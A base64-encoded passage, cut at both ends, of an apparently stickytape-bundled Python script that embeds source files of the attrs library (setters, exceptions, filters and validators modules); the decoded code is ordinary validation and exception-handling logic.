XJzaW9uYWRkZWQ6OiAyMC4xLjBcbiAgICAiIiJcbiAgICBpZiBfY29uZmlnLl9ydW5fdmFsaWRhdG9ycyBpcyBGYWxzZTpcbiAgICAgICAgcmV0dXJuIG5ld192YWx1ZVxuXG4gICAgdiA9IGF0dHJpYi52YWxpZGF0b3JcbiAgICBpZiBub3QgdjpcbiAgICAgICAgcmV0dXJuIG5ld192YWx1ZVxuXG4gICAgdihpbnN0YW5jZSwgYXR0cmliLCBuZXdfdmFsdWUpXG5cbiAgICByZXR1cm4gbmV3X3ZhbHVlXG5cblxuZGVmIGNvbnZlcnQoaW5zdGFuY2UsIGF0dHJpYiwgbmV3X3ZhbHVlKTpcbiAgICAiIiJcbiAgICBSdW4gKmF0dHJpYipcJ3MgY29udmVydGVyIC0tIGlmIGl0IGhhcyBvbmUgLS0gIG9uICpuZXdfdmFsdWUqIGFuZCByZXR1cm4gdGhlXG4gICAgcmVzdWx0LlxuXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMjAuMS4wXG4gICAgIiIiXG4gICAgYyA9IGF0dHJpYi5jb252ZXJ0ZXJcbiAgICBpZiBjOlxuICAgICAgICByZXR1cm4gYyhuZXdfdmFsdWUpXG5cbiAgICByZXR1cm4gbmV3X3ZhbHVlXG5cblxuTk9fT1AgPSBvYmplY3QoKVxuIiIiXG5TZW50aW5lbCBmb3IgZGlzYWJsaW5nIGNsYXNzLXdpZGUgKm9uX3NldGF0dHIqIGhvb2tzIGZvciBjZXJ0YWluIGF0dHJpYnV0ZXMuXG5cbkRvZXMgbm90IHdvcmsgaW4gYHBpcGVgIG9yIHdpdGhpbiBsaXN0cy5cblxuLi4gdmVyc2lvbmFkZGVkOjogMjAuMS4wXG4iIiJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhdHRyL2V4Y2VwdGlvbnMucHknLCBiJyMgU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVFxuXG5mcm9tIF9fZnV0dXJlX18gaW1wb3J0IGFic29sdXRlX2ltcG9ydCwgZGl2aXNpb24sIHByaW50X2Z1bmN0aW9uXG5cblxuY2xhc3MgRnJvemVuRXJyb3IoQXR0cmlidXRlRXJyb3IpOlxuICAgICIiIlxuICAgIEEgZnJvemVuL2ltbXV0YWJsZSBpbnN0YW5jZSBvciBhdHRyaWJ1dGUgaGF2ZSBiZWVuIGF0dGVtcHRlZCB0byBiZVxuICAgIG1vZGlmaWVkLlxuXG4gICAgSXQgbWlycm9ycyB0aGUgYmVoYXZpb3Igb2YgYGBuYW1lZHR1cGxlc2BgIGJ5IHVzaW5nIHRoZSBzYW1lIGVycm9yIG1lc3NhZ2VcbiAgICBhbmQgc3ViY2xhc3NpbmcgYEF0dHJpYnV0ZUVycm9yYC5cblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDIwLjEuMFxuICAgICIiIlxuXG4gICAgbXNnID0gImNhblwndCBzZXQgYXR0cmlidXRlIlxuICAgIGFyZ3MgPSBbbXNnXVxuXG5cbmNsYXNzIEZyb3plbkluc3RhbmNlRXJyb3IoRnJvemVuRXJyb3IpOlxuICAgICIiIlxuICAgIEEgZnJvemVuIGluc3RhbmNlIGhhcyBiZWVuIGF0dGVtcHRlZCB0byBiZSBtb2RpZmllZC5cblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDE2LjEuMFxuICAgICIiIlxuXG5cbmNsYXNzIEZyb3plbkF0dHJpYnV0ZUVycm9yKEZyb3plbkVycm9yKTpcbiAgICAiIiJcbiAgICBBIGZyb3plbiBhdHRyaWJ1dGUgaGFzIGJlZW4gYXR0ZW1wdGVkIHRvIGJlIG1vZGlmaWVkLlxuXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMjAuMS4wXG4gICAgIiIiXG5cblxuY2xhc3MgQXR0cnNBdHRyaWJ1dGVOb3RGb3VuZEVycm9yKFZhbHVlRXJyb3IpOlxuICAgICIiIlxuICAgIEFuIGBgYXR0cnNgYCBmdW5jdGlvbiBjb3VsZG5cJ3QgZmluZCBhbiBhdHRyaWJ1dGUgdGhhdCB0aGUgdXNlciBhc2tlZCBmb3IuXG5cbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAxNi4yLjBcbiAgICAiIiJcblxuXG5jbGFzcyBOb3RBbkF0dHJzQ2xhc3NFcnJvcihWYWx1ZUVycm9yKTpcbiAgICAiIiJcbiAgICBBIG5vbi1gYGF0dHJzYGAgY2xhc3MgaGFzIGJlZW4gcGFzc2VkIGludG8gYW4gYGBhdHRyc2BgIGZ1bmN0aW9uLlxuXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMTYuMi4wXG4gICAgIiIiXG5cblxuY2xhc3MgRGVmYXVsdEFscmVhZHlTZXRFcnJvcihSdW50aW1lRXJyb3IpOlxuICAgICIiIlxuICAgIEEgZGVmYXVsdCBoYXMgYmVlbiBzZXQgdXNpbmcgYGBhdHRyLmliKClgYCBhbmQgaXMgYXR0ZW1wdGVkIHRvIGJlIHJlc2V0XG4gICAgdXNpbmcgdGhlIGRlY29yYXRvci5cblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDE3LjEuMFxuICAgICIiIlxuXG5cbmNsYXNzIFVuYW5ub3RhdGVkQXR0cmlidXRlRXJyb3IoUnVudGltZUVycm9yKTpcbiAgICAiIiJcbiAgICBBIGNsYXNzIHdpdGggYGBhdXRvX2F0dHJpYnM9VHJ1ZWBgIGhhcyBhbiBgYGF0dHIuaWIoKWBgIHdpdGhvdXQgYSB0eXBlXG4gICAgYW5ub3RhdGlvbi5cblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDE3LjMuMFxuICAgICIiIlxuXG5cbmNsYXNzIFB5dGhvblRvb09sZEVycm9yKFJ1bnRpbWVFcnJvcik6XG4gICAgIiIiXG4gICAgSXQgd2FzIGF0dGVtcHRlZCB0byB1c2UgYW4gYGBhdHRyc2BgIGZlYXR1cmUgdGhhdCByZXF1aXJlcyBhIG5ld2VyIFB5dGhvblxuICAgIHZlcnNpb24uXG5cbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAxOC4yLjBcbiAgICAiIiJcblxuXG5jbGFzcyBOb3RDYWxsYWJsZUVycm9yKFR5cGVFcnJvcik6XG4gICAgIiIiXG4gICAgQSBgYGF0dHIuaWIoKWBgIHJlcXVpcmluZyBhIGNhbGxhYmxlIGhhcyBiZWVuIHNldCB3aXRoIGEgdmFsdWVcbiAgICB0aGF0IGlzIG5vdCBjYWxsYWJsZS5cblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDE5LjIuMFxuICAgICIiIlxuXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIG1zZywgdmFsdWUpOlxuICAgICAgICBzdXBlcihUeXBlRXJyb3IsIHNlbGYpLl9faW5pdF9fKG1zZywgdmFsdWUpXG4gICAgICAgIHNlbGYubXNnID0gbXNnXG4gICAgICAgIHNlbGYudmFsdWUgPSB2YWx1ZVxuXG4gICAgZGVmIF9fc3RyX18oc2VsZik6XG4gICAgICAgIHJldHVybiBzdHIoc2VsZi5tc2cpXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYXR0ci9maWx0ZXJzLnB5JywgYicjIFNQRFgtTGljZW5zZS1JZGVudGlmaWVyOiBNSVRcblxuIiIiXG5Db21tb25seSB1c2VmdWwgZmlsdGVycyBmb3IgYGF0dHIuYXNkaWN0YC5cbiIiIlxuXG5mcm9tIF9fZnV0dXJlX18gaW1wb3J0IGFic29sdXRlX2ltcG9ydCwgZGl2aXNpb24sIHByaW50X2Z1bmN0aW9uXG5cbmZyb20gLl9jb21wYXQgaW1wb3J0IGlzY2xhc3NcbmZyb20gLl9tYWtlIGltcG9ydCBBdHRyaWJ1dGVcblxuXG5kZWYgX3NwbGl0X3doYXQod2hhdCk6XG4gICAgIiIiXG4gICAgUmV0dXJucyBhIHR1cGxlIG9mIGBmcm96ZW5zZXRgcyBvZiBjbGFzc2VzIGFuZCBhdHRyaWJ1dGVzLlxuICAgICIiIlxuICAgIHJldHVybiAoXG4gICAgICAgIGZyb3plbnNldChjbHMgZm9yIGNscyBpbiB3aGF0IGlmIGlzY2xhc3MoY2xzKSksXG4gICAgICAgIGZyb3plbnNldChjbHMgZm9yIGNscyBpbiB3aGF0IGlmIGlzaW5zdGFuY2UoY2xzLCBBdHRyaWJ1dGUpKSxcbiAgICApXG5cblxuZGVmIGluY2x1ZGUoKndoYXQpOlxuICAgICIiIlxuICAgIEluY2x1ZGUgKndoYXQqLlxuXG4gICAgOnBhcmFtIHdoYXQ6IFdoYXQgdG8gaW5jbHVkZS5cbiAgICA6dHlwZSB3aGF0OiBgbGlzdGAgb2YgYHR5cGVgIG9yIGBhdHRycy5BdHRyaWJ1dGVgXFxcXCBzXG5cbiAgICA6cnR5cGU6IGBjYWxsYWJsZWBcbiAgICAiIiJcbiAgICBjbHMsIGF0dHJzID0gX3NwbGl0X3doYXQod2hhdClcblxuICAgIGRlZiBpbmNsdWRlXyhhdHRyaWJ1dGUsIHZhbHVlKTpcbiAgICAgICAgcmV0dXJuIHZhbHVlLl9fY2xhc3NfXyBpbiBjbHMgb3IgYXR0cmlidXRlIGluIGF0dHJzXG5cbiAgICByZXR1cm4gaW5jbHVkZV9cblxuXG5kZWYgZXhjbHVkZSgqd2hhdCk6XG4gICAgIiIiXG4gICAgRXhjbHVkZSAqd2hhdCouXG5cbiAgICA6cGFyYW0gd2hhdDogV2hhdCB0byBleGNsdWRlLlxuICAgIDp0eXBlIHdoYXQ6IGBsaXN0YCBvZiBjbGFzc2VzIG9yIGBhdHRycy5BdHRyaWJ1dGVgXFxcXCBzLlxuXG4gICAgOnJ0eXBlOiBgY2FsbGFibGVgXG4gICAgIiIiXG4gICAgY2xzLCBhdHRycyA9IF9zcGxpdF93aGF0KHdoYXQpXG5cbiAgICBkZWYgZXhjbHVkZV8oYXR0cmlidXRlLCB2YWx1ZSk6XG4gICAgICAgIHJldHVybiB2YWx1ZS5fX2NsYXNzX18gbm90IGluIGNscyBhbmQgYXR0cmlidXRlIG5vdCBpbiBhdHRyc1xuXG4gICAgcmV0dXJuIGV4Y2x1ZGVfXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYXR0ci92YWxpZGF0b3JzLnB5JywgYicjIFNQRFgtTGljZW5zZS1JZGVudGlmaWVyOiBNSVRcblxuIiIiXG5Db21tb25seSB1c2VmdWwgdmFsaWRhdG9ycy5cbiIiIlxuXG5mcm9tIF9fZnV0dXJlX18gaW1wb3J0IGFic29sdXRlX2ltcG9ydCwgZGl2aXNpb24sIHByaW50X2Z1bmN0aW9uXG5cbmltcG9ydCBvcGVyYXRvclxuaW1wb3J0IHJlXG5cbmZyb20gY29udGV4dGxpYiBpbXBvcnQgY29udGV4dG1hbmFnZXJcblxuZnJvbSAuX2NvbmZpZyBpbXBvcnQgZ2V0X3J1bl92YWxpZGF0b3JzLCBzZXRfcnVuX3ZhbGlkYXRvcnNcbmZyb20gLl9tYWtlIGltcG9ydCBfQW5kVmFsaWRhdG9yLCBhbmRfLCBhdHRyaWIsIGF0dHJzXG5mcm9tIC5leGNlcHRpb25zIGltcG9ydCBOb3RDYWxsYWJsZUVycm9yXG5cblxudHJ5OlxuICAgIFBhdHRlcm4gPSByZS5QYXR0ZXJuXG5leGNlcHQgQXR0cmlidXRlRXJyb3I6ICAjIFB5dGhvbiA8My43IGxhY2tzIGEgUGF0dGVybiB0eXBlLlxuICAgIFBhdHRlcm4gPSB0eXBlKHJlLmNvbXBpbGUoIiIpKVxuXG5cbl9fYWxsX18gPSBbXG4gICAgImFuZF8iLFxuICAgICJkZWVwX2l0ZXJhYmxlIixcbiAgICAiZGVlcF9tYXBwaW5nIixcbiAgICAiZGlzYWJsZWQiLFxuICAgICJnZSIsXG4gICAgImdldF9kaXNhYmxlZCIsXG4gICAgImd0IixcbiAgICAiaW5fIixcbiAgICAiaW5zdGFuY2Vfb2YiLFxuICAgICJpc19jYWxsYWJsZSIsXG4gICAgImxlIixcbiAgICAibHQiLFxuICAgICJtYXRjaGVzX3JlIixcbiAgICAibWF4X2xlbiIsXG4gICAgIm9wdGlvbmFsIixcbiAgICAicHJvdmlkZXMiLFxuICAgICJzZXRfZGlzYWJsZWQiLFxuXVxuXG5cbmRlZiBzZXRfZGlzYWJsZWQoZGlzYWJsZWQpOlxuICAgICIiIlxuICAgIEdsb2JhbGx5IGRpc2FibGUgb3IgZW5hYmxlIHJ1bm5pbmcgdmFsaWRhdG9ycy5cblxuICAgIEJ5IGRlZmF1bHQsIHRoZXkgYXJlIHJ1bi5cblxuICAgIDpwYXJhbSBkaXNhYmxlZDogSWYgYGBUcnVlYGAsIGRpc2FibGUgcnVubmluZyBhbGwgdmFsaWRhdG9ycy5cbiAgICA6dHlwZSBkaXNhYmxlZDogYm9vbFxuXG4gICAgLi4gd2FybmluZzo6XG5cbiAgICAgICAgVGhpcyBmdW5jdGlvbiBpcyBub3QgdGhyZWFkLXNhZmUhXG5cbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAyMS4zLjBcbiAgICAiIiJcbiAgICBzZXRfcnVuX3ZhbGlkYXRvcnMobm90IGRpc2FibGVkKVxuXG5cbmRlZiBnZXRfZGlzYWJsZWQoKTpcbiAgICAiIiJcbiAgICBSZXR1cm4gYSBib29sIGluZGljYXRpbmcgd2hldGhlciB2YWxpZGF0b3JzIGFyZSBjdXJyZW50bHkgZGlzYWJsZWQgb3Igbm90LlxuXG4gICAgOnJldHVybjogYGBUcnVlYGAgaWYgdmFsaWRhdG9ycyBhcmUgY3VycmVudGx5IGRpc2FibGVkLlxuICAgIDpydHlwZTogYm9vbFxuXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMjEuMy4wXG4gICAgIiIiXG4gICAgcmV0dXJuIG5vdCBnZXRfcnVuX3ZhbGlkYXRvcnMoKVxuXG5cbkBjb250ZXh0bWFuYWdlclxuZGVmIGRpc2FibGVkKCk6XG4gICAgIiIiXG4gICAgQ29udGV4dCBtYW5hZ2VyIHRoYXQgZGlzYWJsZXMgcnVubmluZyB2YWxpZGF0b3JzIHdpdGhpbiBpdHMgY29udGV4dC5cblxuICAgIC4uIHdhcm5pbmc6OlxuXG4gICAgICAgIFRoaXMgY29udGV4dCBtYW5hZ2VyIGlzIG5vdCB0aHJlYWQtc2FmZSFcblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDIxLjMuMFxuICAgICIiIlxuICAgIHNldF9ydW5fdmFsaWRhdG9ycyhGYWxzZSlcbiAgICB0cnk6XG4gICAgICAgIHlpZWxkXG4gICAgZmluYWxseTpcbiAgICAgICAgc2V0X3J1bl92YWxpZGF0b3JzKFRydWUpXG5cblxuQGF0dHJzKHJlcHI9RmFsc2UsIHNsb3RzPVRydWUsIGhhc2g9VHJ1ZSlcbmNsYXNzIF9JbnN0YW5jZU9mVmFsaWRhdG9yKG9iamVjdCk6XG4gICAgdHlwZSA9IGF0dHJpYigpXG5cbiAgICBkZWYgX19jYWxsX18oc2VsZiwgaW5zdCwgYXR0ciwgdmFsdWUpOlxuICAgICAgICAiIiJcbiAgICAgICAgV2UgdXNlIGEgY2FsbGFibGUgY2xhc3MgdG8gYmUgYWJsZSB0byBjaGFuZ2UgdGhlIGBgX19yZXByX19gYC5cbiAgICAgICAgIiIiXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHZhbHVlLCBzZWxmLnR5cGUpOlxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxuICAgICAgICAgICAgICAgICJcJ3tuYW1lfVwnIG11c3QgYmUge3R5cGUhcn0gKGdvdCB7dmFsdWUhcn0gdGhhdCBpcyBhICJcbiAgICAgICAgICAgICAgICAie2FjdHVhbCFyfSkuIi5mb3JtYXQoXG4gICAgICAgICAgICAgICAgICAgIG5hbWU9YXR0ci5uYW1lLFxuICAgICAgICAgICAgICAgICAgICB0eXBlPXNlbGYudHlwZSxcbiAgICAgICAgICAgICAgICAgICAgYWN0dWFsPXZhbHVlLl9fY2xhc3NfXyxcbiAgICAgICAgICAgICAgICAgICAgdmFsdWU9dmFsdWUsXG4gICAgICAgICAgICAgICAgKSxcbiAgICAgICAgICAgICAgICBhdHRyLFxuICAgICAgICAgICAgICAgIHNlbGYudHlwZSxcbiAgICAgICAgICAgICAgICB2YWx1ZSxcbiAgICAgICAgICAgIClcblxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKTpcbiAgICAgICAgcmV0dXJuICI8aW5zdGFuY2Vfb2YgdmFsaWRhdG9yIGZvciB0eXBlIHt0eXBlIXJ9PiIuZm9ybWF0KFxuICAgICAgICAgICAgdHlwZT1zZWxmLnR5cGVcbiAgICAgICAgKVxuXG5cbmRlZiBpbnN0YW5jZV9vZih0eXBlKTpcbiAgICAiIiJcbiAgICBBIHZhbGlkYXRvciB0aGF0IHJhaXNlcyBhIGBUeXBlRXJyb3JgIGlmIHRoZSBpbml0aWFsaXplciBpcyBjYWxsZWRcbiAgICB3aXRoIGEgd3JvbmcgdHlwZSBmb3IgdGhpcyBwYXJ0aWN1bGFyIGF0dHJpYnV0ZSAoY2hlY2tzIGFyZSBwZXJmb3JtZWQgdXNpbmdcbiAgICBgaXNpbnN0YW5jZWAgdGhlcmVmb3JlIGl0XCdzIGFsc28gdmFsaWQgdG8gcGFzcyBhIHR1cGxlIG9mIHR5cGVzKS5cblxuICAgIDpwYXJhbSB0eXBlOiBUaGUgdHlwZSB0byBjaGVjayBmb3IuXG4gICAgOnR5cGUgdHlwZTogdHlwZSBvciB0dXBsZSBvZiB0eXBlc1xuXG4gICAgOnJhaXNlcyBUeXBlRXJyb3I6IFdpdGggYSBodW1hbiByZWFkYWJsZSBlcnJvciBtZXNzYWdlLCB0aGUgYXR0cmlidXRlXG4gICAgICAgIChvZiB0eXBlIGBhdHRycy5BdHRyaWJ1dGVgKSwgdGhlIGV4cGVjdGVkIHR5cGUsIGFuZCB0aGUgdmFsdWUgaXRcbiAgICAgICAgZ290LlxuICAgICIiIlxuICAgIHJldHVybiBfSW5zdGFuY2VPZlZhbGlkYXRvcih0eXBlKVxuXG5cbkBhdHRycyhyZXByPUZhbHNlLCBmcm96ZW49VHJ1ZSwgc2xvdHM9VHJ1ZSlcbmNsYXNzIF9NYXRjaGVzUmVWYWxpZGF0b3Iob2JqZWN0KTpcbiAgICBwYXR0ZXJuID0gYXR0cmliKClcbiAgICBtYXRjaF9mdW5jID0gYXR0cmliKClcblxuICAgIGRlZiBfX2NhbGxfXyhzZWxmLCBpbnN0LCBhdHRyLCB2YWx1ZSk6XG4gICAgICAgICIiIlxuICAgICAgICBXZSB1c2UgYSBjYWxsYWJsZSBjbGFzcyB0byBiZSBhYmxlIHRvIGNoYW5nZSB0aGUgYGBfX3JlcHJfX2BgLlxuICAgICAgICAiIiJcbiAgICAgICAgaWYgbm90IHNlbGYubWF0Y2hfZnVuYyh2YWx1ZSk6XG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxuICAgICAgICAgICAgICAgICJcJ3tuYW1lfVwnIG11c3QgbWF0Y2ggcmVnZXgge3BhdHRlcm4hcn0iXG4gICAgICAgICAgICAgICAgIiAoe3ZhbHVlIXJ9IGRvZXNuXCd0KSIuZm9ybWF0KFxuICAgICAgICAgICAgICAgICAgICBuYW1lPWF0dHIubmFtZSwgcGF0dGVybj1zZWxmLnBhdHRlcm4ucGF0dGVybiwgdmFsdWU9dmFsdWVcbiAgICAgICAgICAgICAgICApLFxuICAgICAgICAgICAgICAgIGF0dHIsXG4gICAgICAgICAgICAgICAgc2VsZi5wYXR0ZXJuLFxuICAgICAgICAgICAgICAgIHZhbHVlLFxuICAgICAgICAgICAgKVxuXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpOlxuICAgICAgICByZXR1cm4gIjxtYXRjaGVzX3JlIHZhbGlkYXRvciBmb3IgcGF0dGVybiB7cGF0dGVybiFyfT4iLmZvcm1hdChcbiAgICAgICAgICAgIHBhdHRlcm49c2VsZi5wYXR0ZXJuXG4gICAgICAgIClcblxuXG5kZWYgbWF0Y2hlc19yZShyZWdleCwgZmxhZ3M9MCwgZnVuYz1Ob25lKTpcbiAgICByIiIiXG4gICAgQSB2YWxpZGF0b3IgdGhhdCByYWlzZXMgYFZhbHVlRXJyb3JgIGlmIHRoZSBpbml0aWFsaXplciBpcyBjYWxsZWRcbiAgICB3aXRoIGEgc3RyaW5nIHRoYXQgZG9lc25cJ3QgbWF0Y2ggKnJlZ2V4Ki5cblxuICAgIDpwYXJhbSByZWdleDogYSByZWdleCBzdHJpbmcgb3IgcHJlY29tcGlsZWQgcGF0dGVybiB0byBtYXRjaCBhZ2FpbnN0XG4gICAgOnBhcmFtIGludCBmbGFnczogZmxhZ3MgdGhhdCB3aWxsIGJlIHBhc3NlZCB0byB0aGUgdW5kZXJseWluZyByZSBmdW5jdGlvblxuICAgICAgICAoZGVmYXVsdCAwKVxuICAgIDpwYXJhbSBjYWxsYWJsZSBmdW5jOiB3aGljaCB1bmRlcmx5aW5nIGByZWAgZnVuY3Rpb24gdG8gY2FsbCAob3B0aW9uc1xuICAgICAgICBhcmUgYHJlLmZ1bGxtYXRjaGAsIGByZS5zZWFyY2hgLCBgcmUubWF0Y2hgLCBkZWZhdWx0XG4gICAgICAgIGlzIGBgTm9uZWBgIHdoaWNoIG1lYW5zIGVpdGhlciBgcmUuZnVsbG1hdGNoYCBvciBhbiBlbXVsYXRpb24gb2ZcbiAgICAgICAgaXQgb24gUHl0aG9uIDIpLiBGb3IgcGVyZm9ybWFuY2UgcmVhc29ucywgdGhleSB3b25cJ3QgYmUgdXNlZCBkaXJlY3RseVxuICAgICAgICBidXQgb24gYSBwcmUtYHJlLmNvbXBpbGVgXFwgZWQgcGF0dGVybi5cblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDE5LjIuMFxuICAgIC4uIHZlcnNpb25jaGFuZ2VkOjogMjEuMy4wICpyZWdleCogY2FuIGJlIGEgcHJlLWNvbXBpbGVkIHBhdHRlcm4uXG4gICAgIiIiXG4gICAgZnVsbG1hdGNoID0gZ2V0YXR0cihyZSwgImZ1bGxtYXRjaCIsIE5vbmUpXG4gICAgdmFsaWRfZnVuY3MgPSAoZnVsbG1hdGNoLCBOb25lLCByZS5zZWFyY2gsIHJlLm1hdGNoKVxuICAgIGlmIGZ1bmMgbm90IGluIHZhbGlkX2Z1bmNzOlxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxuICAgICAgICAgICAgIlwnZnVuY1wnIG11c3QgYmUgb25lIG9mIHt9LiIuZm9ybWF0KFxuICAgICAgICAgICAgICAgICIsICIuam9pbihcbiAgICAgICAgICAgICAgICAgICAgc29ydGVkKFxuICAgICAgICAgICAgICAgICAgICAgICAgZSBhbmQgZS5fX25hbWVfXyBvciAiTm9uZSIgZm9yIGUgaW4gc2V0KHZhbGlkX2Z1bmNzKVxuICAgICAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgKVxuICAgICAgICApXG5cbiAgICBpZiBpc2luc3RhbmNlKHJlZ2V4LCBQYXR0ZXJuKTpcbiAgICAgICAgaWYgZmxhZ3M6XG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXG4gICAgICAgICAgICAgICAgIlwnZmxhZ3NcJyBjYW4gb25seSBiZSB1c2VkIHdpdGggYSBzdHJpbmcgcGF0dGVybjsgIlxuICAgICAgICAgICAgICAgICJwYXNzIGZsYWdzIHRvIHJlLmNvbXBpbGUoKSBpbnN0ZWFkIlxuICAgICAgICAgICAgKVxuICAgICAgICBwYXR0ZXJuID0gcmVnZXhcbiAgICBlbHNlOlxuICAgICAgICBwYXR0ZXJuID0gcmUuY29tcGlsZShyZWdleCwgZmxhZ3MpXG5cbiAgICBpZiBmdW5jIGlzIHJlLm1hdGNoOlxuICAgICAgICBtYXRjaF9mdW5jID0gcGF0dGVybi5tYXRjaFxuICAgIGVsaWYgZnVuYyBpcyByZS5zZWFyY2g6XG4gICAgICAgIG1hdGNoX2Z1bmMgPSBwYXR0ZXJuLnNlYXJjaFxuICAgIGVsaWYgZnVsbG1hdGNoOlxuICAgICAgICBtYXRjaF9mdW5jID0gcGF0dGVybi5mdWxsbWF0Y2hcbiAgICBlbHNlOiAgIyBQeXRob24gMiBmdWxsbWF0Y2ggZW11bGF0aW9uIChodHRwczovL2J1Z3MucHl0aG9uLm9yZy9pc3N1ZTE2MjAzKVxuICAgICAgICBwYXR0ZXJuID0gcmUuY29tcGlsZShcbiAgICAgICAgICAgIHIiKD86e30pXFxaIi5mb3JtYXQocGF0dGVybi5wYXR0ZXJuKSwgcGF0dGVybi5mbGFnc1xuICAgICAgICApXG4gICAgICAgIG1hdGNoX2Z1bmMgPSBwYXR0ZXJuLm1hdGNoXG5cbiAgICByZXR1cm4gX01hdGNoZXNSZVZhbGlkYXRvcihwYXR0ZXJuLCBtYXRjaF9mdW5jKVxuXG5cbkBhdHRycyhyZXByPUZhbHNlLCBzbG90cz1UcnVlLCBoYXNoPVRydWUpXG5jbGFzcyBfUHJvdmlkZXNWYWxpZGF0b3Iob2JqZWN0KTpcbiAgICBpbnRlcmZhY2UgPSBhdHRyaWIoKVxuXG4gICAgZGVmIF9fY2FsbF9fKHNlbGYsIGluc3QsIGF0dHIsIHZhbHVlKTpcbiAgICAgICAgIiIiXG4gICAgICAgIFdlIHVzZSBhIGNhbGxhYmxlIGNsYXNzIHRvIGJlIGFibGUgdG8gY2hhbmdlIHRoZSBgYF9fcmVwcl9fYGAuXG4gICAgICAgICIiIlxuICAgICAgICBpZiBub3Qgc2VsZi5pbnRlcmZhY2UucHJvdmlkZWRCeSh2YWx1ZSk6XG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXG4gICAgICAgICAgICAgICAgIlwne25hbWV9XCcgbXVzdCBwcm92aWRlIHtpbnRlcmZhY2Uhcn0gd2hpY2gge3ZhbHVlIXJ9ICJcbiAgICAgICAgICAgICAgICAiZG9lc25cJ3QuIi5mb3JtYXQoXG4gICAgICAgICAgICAgICAgICAgIG5hbWU9YXR0ci5uYW1lLCBpbnRlcmZhY2U9c2VsZi5pbnRlcmZhY2UsIHZhbHVlPXZhbHVlXG4gICAgICAgICAgICAgICAgKSxcbiAgICAgICAgICAgICAgICBhdHRyLFxuICAgICAgICAgICAgICAgIHNlbGYuaW50ZXJmYWNlLFxuICAgICAgICAgICAgICAgIHZhbHVlLFxuICAgICAgICAgICAgKVxuXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpOlxuICAgICAgICByZXR1cm4gIjxwcm92aWRlcyB2YWxpZGF0b3IgZm9yIGludGVyZmFjZSB7aW50ZXJmYWNlIXJ9PiIuZm9ybWF0KFxuICAgICAgICAgICAgaW50ZXJmYWNlPXNlbGYuaW50ZXJmYWNlXG4gICAgICAgIClcblxuXG5kZWYgcHJvdmlkZXMoaW50ZXJmYWNlKTpcbiAgICAiIiJcbiAgICBBIHZhbGlkYXRvciB0aGF0IHJhaXNlcyBhIGBUeXBlRXJyb3JgIGlmIHRoZSBpbml0aWFsaXplciBpcyBjYWxsZWRcbiAgICB3aXRoIGFuIG9iamVjdCB0aGF0IGRvZXMgbm90IHByb3ZpZGUgdGhlIHJlcXVlc3RlZCAqaW50ZXJmYWNlKiAoY2hlY2tzIGFyZVxuICAgIHBlcmZvcm1lZCB1c2luZyBgYGludGVyZmFjZS5wcm92aWRlZEJ5KHZhbHVlKWBgIChzZWUgYHpvcGUuaW50ZXJmYWNlXG4gICAgPGh0dHBzOi8vem9wZWludGVyZmFjZS5yZWFkdGhlZG9jcy5pby9lbi9sYXRlc3QvPmBfKS5cblxuICAgIDpwYXJhbSBpbnRlcmZhY2U6IFRoZSBpbnRlcmZhY2UgdG8gY2hlY2sgZm9yLlxuICAgIDp0eXBlIGludGVyZmFjZTogYGB6b3BlLmludGVyZmFjZS5JbnRlcmZhY2VgYFxuXG4gICAgOnJhaXNlcyBUeXBlRXJyb3I6IFdpdGggYSBodW1hbiByZWFkYWJsZSBlcnJvciBtZXNzYWdlLCB0aGUgYXR0cmlidXRlXG4gICAgICAgIChvZiB0eXBlIGBhdHRycy5BdHRyaWJ1dGVgKSwgdGhlIGV4cGVjdGVkIGludGVyZmFjZSwgYW5kIHRoZVxuICAgICAgICB2YWx1ZSBpdCBnb3QuXG4gICAgIiIiXG4gICAgcmV0dXJuIF9Qcm92aWRlc1ZhbGlkYXRvcihpbnRlcmZhY2UpXG5cblxuQGF0dHJzKHJlcHI9RmFsc2UsIHNsb3RzPVRydWUsIGhhc2g9VHJ1ZSlcbmNsYXNzIF9PcHRpb25hbFZhbGlkYXRvcihvYmplY3QpOlxuICAgIHZhbGlkYXRvciA9IGF0dHJpYigpXG5cbiAgICBkZWYgX19jYWxsX18oc2VsZiwgaW5zdCwgYXR0ciwgdmFsdWUpOlxuICAgICAgICBpZiB2YWx1ZSBpcyBOb25lOlxuICAgICAgICAgICAgcmV0dXJuXG5cbiAgICAgICAgc2VsZi52YWxpZGF0b3IoaW5zdCwgYXR0ciwgdmFsdWUpXG5cbiAgICBkZWYgX19yZXByX18oc2VsZik6XG4gICAgICAgIHJldHVybiAiPG9wdGlvbmFsIHZhbGlkYXRvciBmb3Ige3doYXR9IG9yIE5vbmU+Ii5mb3JtYXQoXG4gICAgICAgICAgICB3aGF0PXJlcHIoc2VsZi52YWxpZGF0b3IpXG4gICAgICAgIClcblxuXG5kZWYgb3B0aW9uYWwodmFsaWRhdG9yKTpcbiAgICAiIiJcbiAgICBBIHZhbGlkYXRvciB0aGF0IG1ha2VzIGFuIGF0dHJpYn